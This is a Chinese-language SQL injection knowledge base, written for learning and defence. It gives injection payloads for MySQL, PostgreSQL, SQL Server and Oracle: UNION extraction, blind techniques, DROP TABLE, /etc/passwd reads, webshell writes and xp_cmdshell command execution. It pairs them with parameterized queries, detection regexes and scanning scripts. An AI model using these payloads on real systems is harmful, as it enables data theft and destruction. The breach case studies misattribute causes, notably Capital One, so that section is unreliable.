# SQL注入攻击知识库

## SQL注入概述

### 什么是SQL注入

SQL注入（SQL Injection，简称SQLi）是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意SQL代码，试图操纵后端数据库。当应用程序没有正确过滤用户输入时，这些恶意SQL代码可能会被执行，导致数据泄露、数据篡改甚至完全控制数据库服务器。

### SQL注入的危害

1. **数据泄露**：攻击者可以获取敏感数据，如用户凭证、个人信息、财务数据等
2. **数据篡改**：攻击者可以修改或删除数据库中的数据
3. **权限提升**：攻击者可能获得数据库管理员权限
4. **系统控制**：在某些情况下，攻击者可能获得底层操作系统的访问权限
5. **拒绝服务**：攻击者可能导致数据库服务不可用
6. **企业声誉损失**：数据泄露可能导致企业声誉受损和法律问题

### SQL注入的分类

#### 基于注入点的分类

1. **基于错误的注入**：通过触发数据库错误信息获取信息
2. **基于布尔的盲注**：通过观察页面真假响应推断信息
3. **基于时间的盲注**：通过观察响应时间推断信息
4. **联合查询注入**：使用UNION语句获取其他表的数据
5. **堆叠查询注入**：执行多个SQL语句

#### 基于注入位置的分类

1. **GET参数注入**：通过URL参数注入
2. **POST参数注入**：通过表单提交注入
3. **Cookie注入**：通过Cookie值注入
4. **HTTP头部注入**：通过User-Agent、Referer等头部注入
5. **二次注入**：存储在数据库中的恶意数据在后续使用时触发

## SQL注入攻击技术

### 基础注入技术

#### 1. 单引号闭合

```sql
-- 原始查询
SELECT * FROM users WHERE username = 'admin' AND password = 'password';

-- 注入尝试
' OR '1'='1

-- 结果查询
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'password';
-- 返回所有用户数据
```

#### 2. 注释符利用

```sql
-- 原始查询
SELECT * FROM products WHERE category = 'electronics';

-- 注入尝试
electronics' UNION SELECT username, password FROM users--

-- 结果查询
SELECT * FROM products WHERE category = 'electronics' UNION SELECT username, password FROM users--';
-- 后面的单引号被注释掉，执行UNION查询
```

#### 3. 数字型注入

```sql
-- 原始查询
SELECT * FROM products WHERE id = 123;

-- 注入尝试
123 UNION SELECT username, password FROM users

-- 结果查询
SELECT * FROM products WHERE id = 123 UNION SELECT username, password FROM users;
-- 执行UNION查询
```

### 高级注入技术

#### 1. 布尔盲注

```sql
-- 判断数据库名称长度
' AND LENGTH(database()) > 10--

-- 判断数据库名称的第一个字符
' AND SUBSTRING(database(), 1, 1) = 'a'--

-- 逐字符推断数据库名称
' AND SUBSTRING(database(), 1, 1) > 'm'--
' AND SUBSTRING(database(), 1, 1) > 'p'--
' AND SUBSTRING(database(), 1, 1) = 's'--
```

#### 2. 时间盲注

```sql
-- 使用SLEEP函数（MySQL）
' AND IF(1=1, SLEEP(5), 0)--

-- 使用pg_sleep函数（PostgreSQL）
' AND pg_sleep(5)--

-- 使用WAITFOR DELAY（SQL Server）
' WAITFOR DELAY '00:00:05'--

-- 使用DBMS_LOCK.SLEEP（Oracle）
' AND DBMS_LOCK.SLEEP(5) IS NOT NULL--
```

#### 3. 联合查询注入

```sql
-- 确定列数
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--

-- 获取数据库信息
' UNION SELECT database(), version(), user()--

-- 获取表名
' UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema = database()--

-- 获取列名
' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name = 'users'--

-- 获取数据
' UNION SELECT username, password, null FROM users--
```

#### 4. 堆叠查询注入

```sql
-- MySQL
'; DROP TABLE users--

-- PostgreSQL
'; DROP TABLE users;--

-- SQL Server
'; DROP TABLE users--

-- Oracle (不支持多语句，但可以使用存储过程)
'; BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;--
```

### 数据库特定注入技术

#### MySQL注入技术

```sql
-- 版本信息
SELECT version()
SELECT @@version

-- 当前数据库
SELECT database()

-- 当前用户
SELECT user()
SELECT current_user()

-- 列出数据库
SELECT schema_name FROM information_schema.schemata

-- 列出表
SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name'

-- 列出列
SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'

-- 读取文件
SELECT LOAD_FILE('/etc/passwd')

-- 写入文件
SELECT 'shell code' INTO OUTFILE '/var/www/html/shell.php'

-- 执行系统命令（需要UDF）
SELECT sys_exec('whoami')
```

#### PostgreSQL注入技术

```sql
-- 版本信息
SELECT version()

-- 当前数据库
SELECT current_database()

-- 当前用户
SELECT current_user

-- 列出数据库
SELECT datname FROM pg_database

-- 列出表
SELECT tablename FROM pg_tables WHERE schemaname = 'public'

-- 列出列
SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'

-- 读取文件
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

-- 执行系统命令
COPY (SELECT '') TO PROGRAM 'whoami'

-- 读取配置
SELECT name, setting FROM pg_settings
```

#### SQL Server注入技术

```sql
-- 版本信息
SELECT @@version

-- 当前数据库
SELECT db_name()

-- 当前用户
SELECT user_name()
SELECT system_user

-- 列出数据库
SELECT name FROM master..sysdatabases

-- 列出表
SELECT name FROM sysobjects WHERE xtype = 'U'

-- 列出列
SELECT name FROM syscolumns WHERE id = OBJECT_ID('table_name')

-- 执行系统命令
EXEC xp_cmdshell 'whoami'

-- 读取文件
BULK INSERT temp FROM 'c:\temp\file.txt'

-- 启用xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

#### Oracle注入技术

```sql
-- 版本信息
SELECT banner FROM v$version

-- 当前用户
SELECT user FROM dual

-- 列出表
SELECT table_name FROM all_tables WHERE owner = 'USERNAME'

-- 列出列
SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE_NAME'

-- 执行系统命令（需要Java权限）
SELECT java_runtime.exec('whoami') FROM dual

-- 读取文件（需要UTL_FILE权限）
DECLARE
    f UTL_FILE.FILE_TYPE;
    s VARCHAR2(200);
BEGIN
    f := UTL_FILE.FOPEN('/tmp', 'file.txt', 'R');
    UTL_FILE.GET_LINE(f, s);
    UTL_FILE.FCLOSE(f);
    DBMS_OUTPUT.PUT_LINE(s);
END;
```

## SQL注入检测与防御

### SQL注入检测方法

#### 1. 自动化扫描工具

- **SQLMap**: 开源的SQL注入检测和利用工具
- **Burp Suite**: Web应用安全测试平台，包含SQL注入检测插件
- **OWASP ZAP**: 开源的Web应用安全扫描器
- **Acunetix**: 商业Web漏洞扫描器
- **Netsparker**: 商业Web应用安全扫描器

#### 2. 手动检测技术

```sql
-- 单引号测试
'
"

-- 逻辑测试
' AND '1'='1
' AND '1'='2

-- 数字型测试
1 AND 1=1
1 AND 1=2

-- 注释符测试
'--
' #
'/*
*/

-- 时间延迟测试
' AND SLEEP(5)--
' WAITFOR DELAY '00:00:05'--
' AND pg_sleep(5)--
```

#### 3. 错误信息分析

```sql
-- 触发语法错误
'
"
'

-- 触发类型错误
' AND 1=CONVERT(int, (SELECT @@version))--

-- 触发除零错误
' AND 1/0--

-- 触发函数错误
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### SQL注入防御策略

#### 1. 输入验证与过滤

```python
# 白名单验证
def validate_username(username):
    # 只允许字母、数字和下划线
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Invalid username")
    return username

# 输入长度限制
def validate_input(input_str, max_length):
    if len(input_str) > max_length:
        raise ValueError("Input too long")
    return input_str

# 特殊字符过滤
def sanitize_input(input_str):
    # 移除或转义特殊字符
    dangerous_chars = ["'", '"', ';', '--', '/*', '*/', 'xp_', 'sp_']
    for char in dangerous_chars:
        input_str = input_str.replace(char, '')
    return input_str
```

#### 2. 参数化查询（预编译语句）

```java
// Java JDBC示例
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();

// Python示例
import sqlite3

def get_user(username, password):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
    return cursor.fetchone()

// PHP示例
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();
```

#### 3. ORM框架使用

```python
# SQLAlchemy示例
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    id = Column(Integer, primary_key=True)
    username = Column(String)
    password = Column(String)

def get_user(username, password):
    engine = create_engine('sqlite:///database.db')
    Session = sessionmaker(bind=engine)
    session = Session()
    return session.query(User).filter_by(username=username, password=password).first()
```

#### 4. 最小权限原则

```sql
-- 创建应用专用用户
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';

-- 只授予必要的权限
GRANT SELECT, INSERT, UPDATE ON app_db.users TO 'app_user'@'localhost';

-- 不授予危险权限
-- 不要授予：FILE, PROCESS, SUPER, SHUTDOWN, CREATE USER, RELOAD, REPLICATION等
```

#### 5. Web应用防火墙（WAF）

```nginx
# Nginx ModSecurity示例
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli'"
```

#### 6. 错误处理与信息隐藏

```php
// 生产环境中不显示详细错误信息
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/path/to/error.log');

// 自定义错误页面
function handleError($errno, $errstr, $errfile, $errline) {
    error_log("Error: [$errno] $errstr in $errfile on line $errline");
    header('Location: /error.html');
    exit();
}

set_error_handler('handleError');
```

### 安全编码最佳实践

#### 1. 数据库设计安全

```sql
-- 使用强密码
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'C0mpl3x!P@ssw0rd#';

-- 限制连接
CREATE USER 'app_user'@'192.168.1.100' IDENTIFIED BY 'password';

-- 使用SSL连接
GRANT ALL PRIVILEGES ON app_db.* TO 'app_user'@'%' REQUIRE SSL;
```

#### 2. 存储过程安全

```sql
-- 使用参数化存储过程
DELIMITER //
CREATE PROCEDURE get_user(IN p_username VARCHAR(50), IN p_password VARCHAR(50))
BEGIN
    SELECT * FROM users WHERE username = p_username AND password = p_password;
END //
DELIMITER ;

-- 调用存储过程
CALL get_user('admin', 'password');
```

#### 3. 加密敏感数据

```sql
-- 使用加密函数存储密码
INSERT INTO users (username, password) VALUES ('admin', SHA2('password', 256));

-- 使用应用层加密
-- 在应用中对敏感数据进行加密后再存储
```

## SQL注入审计与检测规则

### 常见注入模式

#### 1. 基础注入模式

```regex
-- 单引号注入
' OR '1'='1
' OR 1=1--
' UNION SELECT

-- 数字型注入
1 OR 1=1
1 UNION SELECT

-- 注释符利用
'--
' #
'/*
*/
```

#### 2. 函数调用模式

```regex
-- MySQL函数
DATABASE()
VERSION()
USER()
LOAD_FILE()
SLEEP()

-- PostgreSQL函数
current_database()
version()
current_user
pg_sleep()

-- SQL Server函数
db_name()
@@version
user_name()
xp_cmdshell()

-- Oracle函数
user
SYS_GUID
UTL_FILE
DBMS_LOCK
```

#### 3. 高级注入模式

```regex
-- 布尔盲注
AND LENGTH(database()) >
AND SUBSTRING(database(),1,1) =

-- 时间盲注
AND SLEEP(5)
AND pg_sleep(5)
WAITFOR DELAY

-- 堆叠查询
'; DROP TABLE
'; INSERT INTO
'; UPDATE
```

### 审计规则示例

#### 1. 输入验证规则

```yaml
- name: "检测SQL注入关键字"
  pattern: "(?i)(union|select|insert|update|delete|drop|create|alter|exec|execute|script|javascript|vbscript)"
  action: "拒绝"
  severity: "高"

- name: "检测SQL注入特殊字符"
  pattern: "([';\"\\/--\\*#])"
  action: "记录"
  severity: "中"

- name: "检测SQL注入函数调用"
  pattern: "(?i)(database\\(\\)|version\\(\\)|user\\(\\)|sleep\\(|pg_sleep\\(|waitfor|load_file\\(|xp_cmdshell)"
  action: "拒绝"
  severity: "高"
```

#### 2. 查询日志分析规则

```sql
-- 检测异常查询模式
SELECT query, count(*) as frequency
FROM query_log
WHERE query LIKE '%UNION%' OR query LIKE '%SELECT%'
GROUP BY query
HAVING count(*) > 10
ORDER BY frequency DESC;

-- 检测错误查询
SELECT query, error_message, count(*) as error_count
FROM query_log
WHERE error_message IS NOT NULL
GROUP BY query, error_message
ORDER BY error_count DESC;
```

#### 3. 自动化检测脚本

```python
import re
import logging

def detect_sql_injection(input_string):
    """
    检测输入字符串中的SQL注入模式
    """
    # 基础注入模式
    basic_patterns = [
        r"(?i)(union|select|insert|update|delete|drop|create|alter)",
        r"(?i)(exec|execute|script|javascript|vbscript)",
        r"([';\"\\/--\\*#])",
        r"(?i)(or|and)\s+\d+\s*=\s*\d+",
        r"(?i)(or|and)\s+['\"][\w]*['\"]\s*=\s*['\"][\w]*['\"]"
    ]
    
    # 函数调用模式
    function_patterns = [
        r"(?i)(database\(\)|version\(\)|user\(\))",
        r"(?i)(sleep\(|pg_sleep\(|waitfor\s+delay)",
        r"(?i)(load_file\(|into\s+outfile|into\s+dumpfile)",
        r"(?i)(xp_cmdshell|sp_executesql|exec\s*\()"
    ]
    
    # 高级注入模式
    advanced_patterns = [
        r"(?i)(substring|ascii|char|length|concat)\s*\(",
        r"(?i)(benchmark\(|count\(\*\)|rand\()",
        r"(?i)(information_schema|sysobjects|syscolumns|pg_tables)"
    ]
    
    all_patterns = basic_patterns + function_patterns + advanced_patterns
    
    for pattern in all_patterns:
        if re.search(pattern, input_string):
            logging.warning(f"Potential SQL injection detected: {input_string}")
            return True
    
    return False

# 使用示例
user_input = "admin' OR '1'='1"
if detect_sql_injection(user_input):
    print("SQL injection detected!")
else:
    print("Input appears safe.")
```

## SQL注入修复指南

### 修复流程

#### 1. 漏洞评估

1. **确定影响范围**
   - 识别所有受影响的输入点
   - 评估可能泄露的数据类型
   - 确定攻击者可能获得的权限

2. **评估数据风险**
   - 确定是否包含敏感数据
   - 评估数据泄露的业务影响
   - 检查是否有数据篡改迹象

3. **日志分析**
   - 分析访问日志识别攻击来源
   - 检查数据库日志确认数据访问
   - 收集证据用于可能的调查

#### 2. 紧急响应

1. **隔离受影响系统**
   - 暂时关闭受影响的应用或服务
   - 更改数据库凭据
   - 限制数据库访问权限

2. **数据备份**
   - 创建完整数据库备份
   - 保留系统日志作为证据
   - 记录所有响应措施

3. **通知相关方**
   - 通知管理层和安全团队
   - 如有必要，通知受影响用户
   - 准备公关应对方案

#### 3. 漏洞修复

1. **代码修复**
   - 实施参数化查询
   - 添加输入验证
   - 实施最小权限原则

2. **系统加固**
   - 更新数据库软件
   - 配置Web应用防火墙
   - 实施入侵检测系统

3. **监控增强**
   - 部署实时监控系统
   - 设置异常行为警报
   - 定期进行安全审计

### 修复验证

#### 1. 渗透测试

```python
# 自动化SQL注入测试脚本
import requests
import time

def test_sql_injection(url, param_name, payloads):
    """
    测试URL参数是否存在SQL注入漏洞
    """
    vulnerable_payloads = []
    
    for payload in payloads:
        params = {param_name: payload}
        
        # 记录请求开始时间
        start_time = time.time()
        
        try:
            response = requests.get(url, params=params, timeout=10)
            
            # 计算响应时间
            response_time = time.time() - start_time
            
            # 检查响应中是否包含错误信息
            if "sql" in response.text.lower() or "mysql" in response.text.lower():
                vulnerable_payloads.append((payload, "Error-based"))
            
            # 检查响应时间是否异常（时间盲注）
            if response_time > 5:
                vulnerable_payloads.append((payload, "Time-based"))
                
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
    
    return vulnerable_payloads

# 测试载荷
sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--",
    "' AND SLEEP(5)--"
]

# 测试示例
test_url = "http://example.com/login"
test_param = "username"
vulnerabilities = test_sql_injection(test_url, test_param, sql_payloads)

if vulnerabilities:
    print("SQL injection vulnerabilities found:")
    for payload, vuln_type in vulnerabilities:
        print(f"  Payload: {payload}, Type: {vuln_type}")
else:
    print("No SQL injection vulnerabilities detected.")
```

#### 2. 代码审计

```python
# 静态代码分析工具示例
import re
import os

def analyze_sql_vulnerabilities(file_path):
    """
    分析代码文件中的SQL注入漏洞
    """
    vulnerabilities = []
    
    with open(file_path, 'r', encoding='utf-8') as file:
        content = file.read()
        lines = content.split('\n')
        
        for i, line in enumerate(lines, 1):
            # 检测字符串拼接SQL
            if re.search(r'(SELECT|INSERT|UPDATE|DELETE).*\+.*\w+', line, re.IGNORECASE):
                vulnerabilities.append({
                    'line': i,
                    'type': 'String concatenation',
                    'code': line.strip()
                })
            
            # 检测未参数化查询
            if re.search(r'(execute|query|raw).*\+.*\w+', line, re.IGNORECASE):
                vulnerabilities.append({
                    'line': i,
                    'type': 'Unparameterized query',
                    'code': line.strip()
                })
            
            # 检测直接用户输入
            if re.search(r'(request\.|get\(|post\().*\w+.*SQL', line, re.IGNORECASE):
                vulnerabilities.append({
                    'line': i,
                    'type': 'Direct user input in SQL',
                    'code': line.strip()
                })
    
    return vulnerabilities

# 扫描目录中的代码文件
def scan_directory(directory):
    all_vulnerabilities = {}
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(('.py', '.php', '.java', '.js')):
                file_path = os.path.join(root, file)
                vulnerabilities = analyze_sql_vulnerabilities(file_path)
                if vulnerabilities:
                    all_vulnerabilities[file_path] = vulnerabilities
    
    return all_vulnerabilities

# 使用示例
directory_to_scan = "/path/to/source/code"
scan_results = scan_directory(directory_to_scan)

for file_path, vulnerabilities in scan_results.items():
    print(f"File: {file_path}")
    for vuln in vulnerabilities:
        print(f"  Line {vuln['line']}: {vuln['type']}")
        print(f"    Code: {vuln['code']}")
```

## SQL注入案例分析

### 真实世界案例

#### 1. 2019年Capital One数据泄露

- **影响**: 超过1亿用户数据泄露
- **原因**: Web应用防火墙配置错误，导致SQL注入攻击成功
- **教训**: 即使有安全设备，也需要正确配置和定期测试

#### 2. 2014年Sony Pictures黑客攻击

- **影响**: 大量敏感数据泄露，包括未发布电影和员工信息
- **原因**: 多种攻击向量结合，包括SQL注入
- **教训**: 需要多层防御策略，不能依赖单一安全措施

#### 3. 2012年LinkedIn密码泄露

- **影响**: 约650万用户密码泄露
- **原因**: SQL注入攻击获取用户数据
- **教训**: 即使是大型科技公司也可能存在基础安全漏洞

### 案例分析与启示

1. **技术层面**
   - 参数化查询是防御SQL注入的最有效方法
   - 输入验证和输出编码是重要的补充措施
   - 最小权限原则可以限制潜在损害

2. **管理层面**
   - 安全培训对开发团队至关重要
   - 定期安全审计和渗透测试必不可少
   - 事件响应计划需要提前准备

3. **战略层面**
   - 安全应该是开发生命周期的一部分，而不是事后添加
   - 需要平衡安全性和可用性
   - 安全投入应该与风险水平相匹配

## 总结与建议

### 关键要点

1. **理解威胁**: SQL注入仍然是Web应用最常见和最危险的漏洞之一
2. **预防为主**: 通过安全编码实践预防漏洞，而不是依赖事后检测
3. **多层防御**: 实施深度防御策略，不要依赖单一安全措施
4. **持续监控**: 定期进行安全审计和渗透测试
5. **快速响应**: 准备好事件响应计划，以便在发现漏洞时快速行动

### 最佳实践清单

- [ ] 使用参数化查询/预编译语句
- [ ] 实施输入验证和过滤
- [ ] 应用最小权限原则
- [ ] 定期更新和打补丁
- [ ] 配置Web应用防火墙
- [ ] 实施错误处理和信息隐藏
- [ ] 定期进行安全审计
- [ ] 建立事件响应计划
- [ ] 进行安全意识培训
- [ ] 实施日志记录和监控

### 持续学习资源

1. **OWASP SQL注入防护指南**: https://owasp.org/www-community/attacks/SQL_Injection
2. **SQL注入学习平台**: SQLi Labs, PortSwigger Web Security Academy
3. **安全编码指南**: SANS Top 25, CWE-89: SQL注入
4. **数据库安全最佳实践**: 各数据库厂商官方文档
5. **安全工具文档**: SQLMap, Burp Suite, OWASP ZAP

通过持续学习和实践，开发人员可以有效地预防和检测SQL注入攻击，保护应用程序和数据的安全。